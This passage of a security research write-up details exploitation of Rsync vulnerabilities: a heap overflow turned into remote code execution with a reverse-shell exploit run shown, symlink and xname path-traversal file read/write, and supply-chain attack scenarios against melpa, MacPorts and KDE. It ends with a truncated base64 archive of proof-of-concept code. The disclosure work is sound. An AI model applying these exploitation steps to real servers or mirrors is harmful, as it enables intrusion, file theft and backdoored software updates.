+structure stored on the heap:
+
+    EVP_MD_CTX *ctx_evp = NULL;
+
+This structure is used by Rsync to calculate digests for chunks in a file. 
+It gets allocated once and initialized for every new hash it produces:
+
+    if (emd && !(nni->flags & NNI_EVP_OK)) {
+        if (!ctx_evp && !(ctx_evp = EVP_MD_CTX_create()))
+            out_of_memory("csum_evp_md");
+        if (EVP_DigestInit_ex(ctx_evp, emd, NULL) == 0)
+        ...
+    }
+
+Under the hood, OpenSSL calls a function pointer within
+EVP_DigestInit_ex() when certain fields are set. Of particular interest
+are the following lines of code within OpenSSL:
+
+    if (ctx->algctx != NULL) {
+        if (ctx->digest != NULL && ctx->digest->freectx != NULL)
+            ctx->digest->freectx(ctx->algctx);
+     ...
+    }
+
+On the last line of the snippet above, the ctx->digest->freectx() function 
+pointer is called with a pointer to another object storedin ctx as its
+argument, giving us full control of the first argument (the rsi register).
+With this gadget, we could build a  ROP chain with this gadget—or, if
+system() or a similar function is available, simply call that instead.
+
+It turns out, Rsync has a shell_exec() function that takes one argument to
+a string, which is executed as a shell command:
+
+    int shell_exec(const char *cmd)
+    {
+        char *shell = getenv("RSYNC_SHELL");
+        int status;
+        pid_t pid;
+
+        if (!shell)
+            return system(cmd);
+
+        if ((pid = fork()) < 0)
+            return -1;
+
+        if (pid == 0) {
+            execlp(shell, shell, "-c", cmd, NULL);
+     ...
+    }
+
+The only thing left to do was to overwrite ctx_evp to point to
+attacker-controlled bytes.
+
+Because we had already leaked the location of the rsync binary in memory,
+along with its r/w pages, we could completely fake the object. We placed
+our crafted objects in globally writable sections and then overwrote the
+ctx_evp pointer to point to the fake object. The resulting layout is
+illustrated below:
+ 
++------------------+-------------------+----------------+----------------+
+| *evp_ctx pointer | struct EVP_MD_CTX | struct EVP_MD  |shell cmd string|
++------------------+-------------------+----------------+----------------+
+          |        ^    |    |         ^                ^
+          |________|    |    |_________|                |
+                        |    digest field               |
+                        |_______________________________|
+                            algxtx field
+
+By placing the faked objects and the shell command to execute around the
+evp_ctx pointer, we were able to write all necessary data for the final
+payload in one-shot. The codepath mentioned before would trigger without
+any further setup after the heap buffer overflow and the
+Arbitrary-Write-Primitive finished. 
+
+The result is Remote-Code-Execution:
+
+$./exploit rsync://example.com:873/files
+[*] Connected to example.com:873 on module files
+[*] Received file list
+[*] Downloaded target file 'foo': index 1, size 1417 (73a2bc1480ce5898)
+[*] Starting leak...
+[+] Leaked .text pointer 0x5572190ca847
+[*] base: 0x557219088000
+[*] shell_exec: 0x5572190b2a50
+[*] ctx_evp: 0x557219114a28
+[*] Spraying heap...
+[*] Setting up reverse shell listener...
+[*] Listening on port 1337
+[*] Sending payload...
+[+] Received connection! Dropping into shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+-- 2.6.0 - Exploitation of Path Traversal Vulnerabilities
+
+In the following sections, we will discuss multiple path traversal issues
+in the Rsync client. They allow a malicious or compromised server to read
+and write arbitrary files on clients' filesystems that connect to the
+server. The malicious server could attempt to read secrets from disk, like
+private SSH keys. Additionally, they could overwrite files such as .bashrc
+or write an SSH key on the client.
+
+These vulnerabilities could be exploited by a trusted server that has been
+compromised, for example through the Remote-Code-Execution exploit we
+described earlier.
+
+-- 2.6.1 - Arbitrary File Write
+
+When the syncing of symbolic links is enabled, either through the -l or 
+-a (--archive) flags, a malicious server can make the client write
+arbitrary files outside of the destination directory.
+
+A malicious server may send the client a file list such as:
+
+    symlink ->/arbitrary/directory
+    symlink/poc.txt
+
+Symbolic links, by default, can be absolute or contain character sequences
+such as ../../.
+
+The client validates the file list and when it sees the symlink/poc.txt
+entry, it will look for a directory called symlink, otherwise it will
+error out. If the server sends a symlink as a directory and a symbolic
+link, it will only keep the directory entry. Therefore, the attack
+requires some additional details to work.
+
+When the protocol is first negotiated, a server can enable inc_recurse
+mode. This mode changes the protocol so that multiple file lists are sent
+incrementally.
+
+One of the key differences to non-recursive mode is that the deduplication
+of entries happens on a per-file-list basis. As a result, a malicious
+server can send a client multiple file lists, for example:
+
+    # file list 1:
+    .
+    ./symlink (directory)
+    ./symlink/poc.txt (regular file)
+
+    # file list 2:
+    ./symlink -> /arbitrary/path (symlink)
+
+As a result, the symlink directory is created first and symlink/poc.txt is
+considered a valid entry in the file list. The server can then send a
+second file list and change the type of symlink to a symbolic link. The
+symlink/poc.txt entry is still valid.
+
+When the server then instructs the client to create the symlink/poc.txt
+file, it will follow the symbolic link and thus files can be created
+outside of the destination directory.
+
+-- 2.6.2 - --safe-links Bypass
+
+The --safe-links CLI flag makes the client validate any symbolic links it
+receives from the server. The desired behavior is that the symbolic links
+target can only be 1) relative to the destination directory and 2) never
+point outside of the destination directory.
+
+The unsafe_symlink() function is responsible for validating these symbolic
+links. The function calculates the traversal depth of a symbolic link
+target, relative to its position within the destination directory.
+
+As an example, the following symbolic link is considered unsafe:
+
+    {DESTINATION}/foo -> ../../
+
+As it points outside the destination directory. On the other hand, the
+following symbolic link is considered safe as it still points within the
+destination directory:
+
+    {DESTINATION}/foo -> a/b/c/d/e/f/../../
+
+This function can be bypassed as it does not consider if the destination
+of a symbolic link contains other symbolic links in the path. For example,
+take the following two symbolic links:
+
+    {DESTINATION}/a -> .
+    {DESTINATION}/foo -> a/a/a/a/a/a/../../
+
+In this case, foo would actually point outside the destination directory.
+However, the unsafe_symlink() function assumes that a/ is a directory and
+that the symbolic link is safe.
+
+-- 2.6.3 - Arbitrary File Read
+
+When the server sends instructions for receiving a file to the receiver,
+it provides the client with an index into the file list(s). The
+corresponding entry is then created. Additionally, it will send a few
+flags that alter the behaviour of the file download.
+
+We mentioned previously that the server receives a list of checksums, each
+checksum related to a chunk of the file which is currently synchronized.
+We established that in simplified terms, the server sends the client
+instructions on which chunks to keep and which to update. The flags the
+server sends tell the client how to update the file. The client needs to
+know if it should overwrite the file in place or first create a copy and
+then replace the old version, for example.
+
+The server can set the flags ITEM_BASIS_TYPE_FOLLOWS and
+ITEM_XNAME_FOLLOWS, which tells the client to read matching chunks from an
+existing file and which file to read from.
+
+By default, there are no checks done on the xname that the server sends.
+The flag sanitize_paths, which causes sanitize_path() to sanitize xname,
+is off for clients:
+
+    if (iflags & ITEM_XNAME_FOLLOWS) {
+        if ((len = read_vstring(f_in, buf, MAXPATHLEN)) < 0)
+            exit_cleanup(RERR_PROTOCOL);
+
+        if (sanitize_paths) {
+            sanitize_path(buf, buf, "", 0, SP_DEFAULT);
+            len = strlen(buf);
+        }
+    }
+
+When the server sets the comparison type to FNAMECMP_FUZZY and provides an
+xname, the attacker can fully control the fnamecmp variable: 
+
+    case FNAMECMP_FUZZY:
+        if (file->dirname) {
+            pathjoin(fnamecmpbuf, sizeof fnamecmpbuf, 
+                file->dirname, xname);
+            fnamecmp = fnamecmpbuf;
+        } else
+            fnamecmp = xname;
+        break;
+
+Control over this variable allows us to open any file as the compare file:
+
+    fd1 = do_open(fnamecmp, O_RDONLY, 0);
+
+The compare file is used in the call to receive_data(), which handles the
+aforementioned instructions, or as they are called in the function tokens,
+received by the server.
+
+Tokens are then read from the server with a negative value, indicating
+thatthe client should read the data from the compare file.
+
+    while ((i = recv_token(f_in, &data)) != 0) {
+    ..snip..
+            if (i > 0) {
+    ..snip..
+            }
+    ..snip..
+            if (fd != -1 && map && 
+                write_file(fd, 0, offset, map, len) != (int)len)
+
+Once recv_token() returns 0, which indicates the end of the
+synchronization, the client calculates a final checksum. This checksum is
+calculated for the entire file contents and compared with a checksum
+received by the server. They are compared as a final sanity check that the
+transfer worked: 
+
+    if (fd != -1 && memcmp(file_sum1, sender_file_sum, xfer_sum_len) != 0)
+        return 0;
+
+If receive_data() returns 0, it indicates to the receiver that an error
+has occurred. Upon the first error, a MSG_REDO is sent from the receiver
+process to the generator process.
+
+    switch (recv_ok) {
+    ..snip..
+    case 0: {
+    ..snip..
+        if (!redoing) {
+            if (read_batch)
+                flist_ndx_push(&batch_redo_list, ndx);
+            send_msg_int(MSG_REDO, ndx);
+            file->flags |= FLAG_FILE_SENT;
+
+Receiving a MSG_REDO causes the generator to send a message to the server
+telling it to resend the file. If the checksums match, no message is sent
+from the generator to the server.
+
+A malicious server is able to use this as a signal determine if the
+checksum they sent matches the checksum generated from the compare file
+they're targeting.
+
+Recall that the server controls blength and count in receive_sums. By
+starting off with a blength and count of 1, the server can send 256 files,
+each with only 1 byte. If the server responds, we know the checksum failed
+and the guess was wrong. If the server doesn't respond, then we've
+determined the value of that byte. On the next iteration, the server
+increases the blength by 1 and sends 256 files again, this time with the
+proper first byte, but different 2nd bytes. They repeat this process until
+they've leaked the target amount of bytes.
+
+-- 3 - Supply Chain Attack Scenarios
+
+The Remote-Code-Execution can be exploited reliably in default
+configurations. Attackers can use the infoleak to fingerprint the version
+of Rsync and the environment it runs in, and prepare an exploit
+accordingly. Also, Rsync daemons run in a fork() loop. Even if one exploit
+attempt fails, it can be retried multiple times. As such, these
+vulnerabilities could have been potentially mass-exploited. In October of
+2024, we performed a shodan.io scan for exposed Rsync instances that
+yielded almost 550,000 instances. We will discuss how we identified a
+vulnerable server in the next section.
+
+Fortunately (and ironically) most exposed servers were not running with the
+latest version installed. Thus, only a subset of these servers were
+vulnerable to exploitation at the time.
+
+Beyond exploiting vulnerable servers and gaining an initial foothold into
+internal infrastructure, a compromised Rsync daemon opens the door to
+supply chain attacks. Rsync is typically deployed alongside HTTP or FTP
+services that host package mirrors, meaning an attacker who controls it
+can surreptitiously inject malicious payloads into downstream software
+updates.
+
+In the following sections, we will explore how attackers may find
+vulnerable servers and what kind of supply chain attacks they could launch
+
+-- 3.0.0 - Finding vulnerable servers
+
+When a client connects to a Rsync daemon, the daemon sends a greeting
+line. This line contains the string "@RSYNCD:"followed by the protocol
+version of the server. An example might be:
+
+    @RSYNCD: 31.0
+
+By simply searching for the @RSYNCD: string on shodan.io, we can find all
+the publicly exposed Rsync daemons. However, more information is needed to
+determine whether a server is vulnerable or not.
+
+Commit 7e2711b [13], which was first released in the same version that
+introduced the memory corruption vulnerabilities, also changed the daemon
+greeting message:
+
+    get_default_nno_list(&valid_auth_checksums, tmpbuf,
+        MAX_NSTR_STRLEN, '\0');
+    io_printf(f_out, "@RSYNCD: %d.%d %s\n", protocol_version, our_sub,
+        tmpbuf);
+
+The snippet above shows that in addition to the previous greeting format,
+a list of supported digest algorithms is printed. For a vulnerable server,
+the list may look something like:
+
+    @RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
+
+The daemon greeting message provides us with all the information required
+to determine whether an instance runs with the vulnerable code. However,
+it does not tell us if authentication is required or if the instance
+allows anonymous read access.
+
+Given the knowledge about the daemon greeting message, we can refine the
+shodan.io query above and come up with ~18,000 servers that were
+vulnerable when we performed these scans in October of 2024.
+
+This scan was made before a patch was available for the vulnerabilities,
+therefore we can determine that these servers were vulnerable. A package
+maintainer could disable SHA hash support at compile time, however SHA
+would not appear in the server greeting. There are no other configuration
+options of which we are aware that can prevent the vulnerability from
+triggering.
+
+Amongst the patches for the reported vulnerabilities was an increase in
+the protocol version:
+
+    make it easier to spot unpatched servers
+    ---
+     rsync.h | 2 +-
+     1 file changed, 1 insertion(+), 1 deletion(-)
+
+    diff --git a/rsync.h b/rsync.h
+    index b9a7101a..9be1297b 100644
+    --- a/rsync.h
+    +++ b/rsync.h
+    @@ -111,7 +111,7 @@
+     
+     /* Update this if you make incompatible changes and ALSO update the
+      * SUBPROTOCOL_VERSION if it is not a final (official) release. */
+    -#define PROTOCOL_VERSION 31
+    +#define PROTOCOL_VERSION 32
+     
+     /* This is used when working on a new protocol version or for any
+      * unofficial protocol tweaks.  It should be a non-zero value for
+      * each pre-release repo
+    -- 
+    2.34.1
+
+The protocol version was explicitly changed to make scanning for
+vulnerable servers easier for defenders.
+
+-- 3.1.0 - Disclaimer and Assumptions We Make
+
+In the following sections, we present case studies of Rsync servers that
+were likely vulnerable at the time of writing. We speculate about
+potential attacks a hypothetical attacker could have launched by
+compromising these systems. However, because we never exploited these
+issues on servers for which we did not have permission, it is difficult to
+verify whether some assumptions are correct in individual cases.
+
+We assume that:
+
+* When Rsync and HTTP(S) traffic are served by the same domain (e.g.
+example.com), we assume that both processes run on the same backend
+server(s). We have no way of knowing backend infrastructure. It may, for
+example, be possible that rsync traffic is routed to a different backend
+server by a reverse proxy.
+* The attackers are in possession of kernel exploits that allow them to
+escalate privileges on an updated Linux server, even with some hardening.
+The exploit facilitates cross-process interaction between e.g. rsync and
+HTTP(S) servers. We have seen such exploits regularly in kCTF [14][15].
+* The servers found by the aforementioned server-greeting method are
+vulnerable and exploitable. At the time of writing this document, no patch
+to these vulnerabilities was available for Rsync.
+
+-- 3.2.0 - Precedent
+
+In 2003, a Gentoo mirror was believed to be compromised [16] through an
+Rsync heap buffer overflow. The forensic analysis revealed that the most
+likely scenario was that an attacker used a Rsync vulnerability to execute
+arbitrary code, and then used a kernel exploit to gain root access and
+install a root-kit. 
+
+From various LWN articles, it looks like someone compromised Debian [17]
+servers, the Linux kernel CVS [18], and the Savannah CVS [19]. All of this
+happened the same year. While we don't have any evidence to support this,
+it may be possible that an organized actor has targeted distribution
+infrastructure in similar ways that we outline here.
+
+-- 3.3.0 - Attack Scenario: Missing Signatures
+
+While it is not common, there are still package managers that make signing
+packages optional. This becomes an issue when an attacker can compromise
+the official download server of the package manager or mirrors of it.
+There is nothing preventing an attacker from simply serving malicious
+files. 
+
+The following section will provide a case-study about melpa.org, a popular
+Emacs Package Archive.
+
+-- 3.3.1 - melpa.org Compromised Mirror Can Serve Backdoored Packages
+
+Melpa is a popular Emacs Package Archive providing an alternative to
+elpa.gnu.org, which is used by default in Emacs. According to its website
+[20], it serves almost 6000 packages which have been downloaded a total of
+372,988,308 times at the time of writing. While melpa.org provides more
+package flexibility, it does not sign packages [21] before making them
+available to download from its official server.
+
+The project's GitHub README.md [22] does warn users that it is not
+responsible for the contents of unofficial mirrors. However, if any of the
+official mirrors using Rsync to synchronize packages is ever compromised,
+nothing is standing in the way of an attacker backdooring the packages.
+
+To confirm that there were no further conditions or constraints on an
+attacker launching a supply chain attack from a compromised mirror server,
+we set up a local mirror with a backdoored version of the dash [23]
+package, which is the most downloaded package from melpa.org. We were able
+to execute arbitrary code without any constraints.
+
+-- 3.4.0 - Attack Scenario: Exploiting Client-Side Vulnerabilities to
+Bypass Signature Validation
+
+We considered other potential attacks against package managers that
+validate signatures yet handle downloaded files in insecure ways that can
+lead to client-side remote code execution—for example, arbitrary
+file-write vulnerabilities.
+
+In the following section, we will examine a case study of CVE-2024-11681
+in MacPorts.
+
+-- 3.4.1.0 - MacPorts RCE When Syncing from Compromised Mirror
+
+MacPorts [24] is a package manager for MacOS. Like other package managers,
+such as APT [25], users periodically update the list of available
+packages, their versions, checksums, and so on. They do this by either
+running port sync or, preferably, port selfupdate. Under the hood, the
+client then uses rsync to download a ports.tar.gz archive and its
+corresponding signature file, ports.tar.gz.rmd160. The MacPorts client
+then verifies the signatures or discards the archive if verification
+fails.
+
+If the signature is valid, the ports.tar.gz file is extracted into the
+same directory that rsync used as its target, creating a directory
+structure like the following:
+
+    total 34776
+    drwxr-xr-x 3 root root     4096 ...   13:37 .
+    drwxr-xr-x 3 root root     4096 ... x 13:37 ..
+    drwxr-xr-x 4  500  505     4096 ... x 13:37 ports
+    -rw-r--r-- 1 root root 35593472 ... x 13:37 ports.tar.gz
+    -rw-r--r-- 1 root root      512 ... x 13:37 ports.tar.gz.rmd160
+
+The ports directory is essentially an up-to-date version of the
+macports/macports-ports [26] GitHub repository.  Each Port contains a 
+Portfile [27] within this directory structure. These files are written in
+Tcl [28] and inform the MacPorts client about the name of the Port,
+dependencies, how to build the Port, and more.
+
+Once the archive is extracted, the MacPorts client attempts to fetch an
+index of all the Ports from the same Rsync server (which is also signed)
+or if it's not served or is outdated, creates its own index using the
+portindex [29] binary. This helper finds all the Portfile files within
+ports and evaluates them.
+
+When evaluated, a Portfile can instruct the client to execute arbitrary
+system commands, for example:
+
+    set x [exec "bash" "-c" "id > /tmp/poc"]
+
+We can verify that this works if we create a file called
+ports/foo/bar/Portfile containing the above snippet, then run the
+portindex binary in the ports directory:
+
+    uid=0(root) gid=0(wheel) groups=0(wheel), snip
+
+The question now becomes, how can an attacker place a controlled Portfile
+on the client's machine, when the archive is signed? We will answer this
+question in the next section.
+
+-- 3.4.1.1 - Creating Arbitrary Portfiles on Clients Machine from a
+Compromised Mirror
+
+We previously mentioned that the client uses Rsync to fetch the
+ports.tar.gz file from its configured mirror(s). The important detail here
+is that, the target directory of rsync and the target in which portindex
+are run, are the same. In theory, a malicious server could serve a valid,
+signed archive and additional Portfiles.
+
+The client blocks this attack by running a second, tightly scoped rsync
+command that fetches only the package index and its signature:
+
+    /usr/bin/rsync \
+        -rtzvl \
+        --delete-after \
+        --include=/PortIndex.rmd160 \
+        --include=/PortIndex \
+        --exclude=* \
+        rsync://localhost:12000/macports/PortIndex_linux_5_i386/
+
+The important flags here are:
+
+* --include=PortIndex.rmd160
+* --include=PortIndex
+* --exclude=*
+
+This instructs the Rsync client to only fetch PortIndex and
+PortIndex.rmd160 and reject everything else. 
+
+The problem here is that in some Rsync implementations and versions
+(described in more detail below) these filters are only enforced on the
+server-side. We compiled rsync.samba.org's server version with a single
+change that ignores all filters sent by the client:
+
+    diff --git a/exclude.c b/exclude.c
+    index 87edbcf7..05028469 100644
+    --- a/exclude.c
+    +++ b/exclude.c
+    @@ -1436,7 +1436,7 @@ void parse_filter_str( \
+                filter_rule_list *listp, const char *rulestr,
+                }
+            }
+
+    -               add_rule(listp, pat, pat_len, rule, xflags);
+    +//             add_rule(listp, pat, pat_len, rule, xflags);
+
+            if (new_rflags & FILTRULE_CVS_IGNORE
+                && !(new_rflags & FILTRULE_MERGE_FILE))
+
+As a result, the server can simply create a ports/foo/bar/Portfile file on
+the client's machine. We confirmed that this worked with openrsync [30]
+2.6.9, the default rsync binary for MacOS at the time of writing. 
+
+It should also work for rsync.samba.org Rsync versions before commit
+b7231c7 [31], which was first released with 3.2.5.
+
+-- 3.5.0 - Attack scenario: Attacking CI/CD Infrastructure
+
+In the final  supply chain attack scenario section, we will discuss other
+ways of launching supply chain attacks, namely by attacking the CI/CD
+infrastructure of package managers directly.
+
+-- 3.5.1.0 - Attacking Rsync Servers Alongside Critical Services
+
+We found tens of thousands of vulnerable Rsync servers. It is reasonable
+to assume compromising a server could serve as an initial foothold into a
+company's internal infrastructure. To avoid speculation and to demonstrate
+Rsync often sits runs alongside critical services, we focus on an upstream
+Git server that exposes an Rsync server on the same domain. If an attacker
+can escalate their access from Rsync to full control over the Git
+instance, they could gain arbitrary write access to the codebase and
+potentially move laterally through the CI/CD pipeline, for example, by
+leaking secrets.
+
+The organization highlighted here has allowed us to name them. We would
+like to thank KDE for their commitment to transparency. They issued an
+advisory immediately and acted quickly to block potential attacks.
+
+-- 3.5.1.1 - invent.kde.org
+
+KDE is a popular choice for a desktop environment and comes installed by
+default in some distributions [32] like Kubuntu and Fedora KDE. KDE's
+website also documents [33] hardware that comes with KDE installed by
+default, like the Steam Deck [34].
+
+As in the other cases, we assume that a vulnerable Rsync server is running
+on invent.kde.org, which also hosts a GitLab instance containing KDE
+related git repositories:
+
+    $ nc invent.kde.org 873
+    @RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
+
+-- 4 - Conclusion
+
+Sophisticated attackers with ample resources are willing to invest years
+building up trust to launch supply chain attacks, as demonstrated by the
+xz backdoor case [35]. The SolarWinds [36] supply chain attacks similarly
+demonstrate how compromising infrastructure can let adversaries insert
+backdoors into software.
+
+In this article, we demonstrated reliably exploitable memory corruption
+vulnerabilities in a decades old software project that is still deployed
+on critical servers. We also explored hypothetical supply chain attacks
+that an attacker could launch by compromising mirror instances. A
+precedent for such attacks happened 21 years ago, when a Gentoo mirror was
+compromised [37] using an Rsync 0-day.
+
+We believe that relying on signatures to protect against compromised
+package management servers is not sufficient, as attackers could
+potentially:
+
+* Compromise CI/CD infrastructure directly and introduce backdoors before
+packages are signed
+* Use the exploit we described as an entry into a distro's infrastructure
+and escalate to signing keys
+* Execute arbitrary code on client machines using client-side
+vulnerabilities in the package manager's ecosystem
+* Exploit workflows that do not validate signatures
+
+Hardening memory unsafe programs continues to stay relevant, even when
+other security mechanisms, such as signatures, are present. If the
+infrastructure allows for it, additional sandboxing and/or virtualization
+should be used to make attacks harder and keep them contained to Rsync.
+
+-- 5 - References
+
+[1] https://rsync.samba.org
+[2] https://forums.gentoo.org/viewtopic.php?t=111779
+[3] https://github.com/RsyncProject/rsync/commit/
+0902b52f6687b1f7952422080d50b93108742e53
+[4] https://github.com/RsyncProject/rsync/commit/
+0902b52f6687b1f7952422080d50b93108742e53
+#diff-f28c2f39e4a7867bfa71ddc1caba524624e4fc43a8e7f858e021342725083e23R985
+[5] https://github.com/RsyncProject/rsync/commit/
+42e2b56c4ede3ab164f9a5c6dae02aa84606a6c1
+[6] https://support2.windriver.com/index.php?page=cve&on=view&id=CVE-2024-
+12084
+[7] https://kb.cert.org/vuls/id/952657
+[8] https://github.com/RsyncProject/rsync/releases/tag/v3.4.0
+[9] https://www.andrew.cmu.edu/course/15-749/READINGS/required/cas/
+tridgell96.pdf
+[10,11] https://github.com/RsyncProject/rsync/commit/
+ae16850dc58e884eb9f5cb7f772342b2db28f471 
+[12] https://azeria-labs.com/heap-exploitation-part-1-understanding-the-
+glibc-heap-implementation/
+[13] https://github.com/RsyncProject/rsync/commit/
+7e2711bb2b4b30bc842dd8670c34a87e2ca0c2df
+[14] https://google.github.io/kctf/introduction.html
+[15] https://security.googleblog.com/2023/06/learnings-from-kctf-
+vrps-42-linux.html
+[16] https://forums.gentoo.org/viewtopic.php?t=111779
+[17] https://lists.debian.org/debian-announce/2003/msg00003.html
+[18] https://lwn.net/Articles/57135/
+[19] https://lwn.net/Articles/64835/
+[20] https://melpa.org
+[21] https://github.com/melpa/melpa/issues/1749
+[22] https://github.com/melpa/melpa?tab=readme-ov-file#mirrors
+[23] https://melpa.org/#/dash
+[24] https://www.macports.org/
+[25] https://en.wikipedia.org/wiki/APT_(software)
+[26] https://github.com/macports/macports-ports
+[27] https://guide.macports.org/chunked/reference.html
+[28] https://www.tcl.tk/about/language.html
+[29] https://github.com/macports/macports-base/blob/
+12986b1c3e03583896330248e0e5c5a64bb7016b/src/port/portindex.tcl#L1
+[30] https://github.com/kristapsdz/openrsync
+[31] https://github.com/RsyncProject/rsync/commit/
+b7231c7d02cfb65d291af74ff66e7d8c507ee871 
+[32] https://kde.org/distributions/
+[33] https://kde.org/hardware/
+[34] https://store.steampowered.com/steamdeck/
+[35] https://www.invicti.com/blog/web-security/xz-utils-backdoor-supply-
+chain-rce-that-got-caught/
+[36] https://www.sans.org/blog/what-you-need-to-know-about-the-solarwinds-
+supply-chain-attack/
+
+-- 6 - Proof-of-Concepts
+
+The following is a base64 encoded ZIP file that contains multiple PoCs:
+
+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
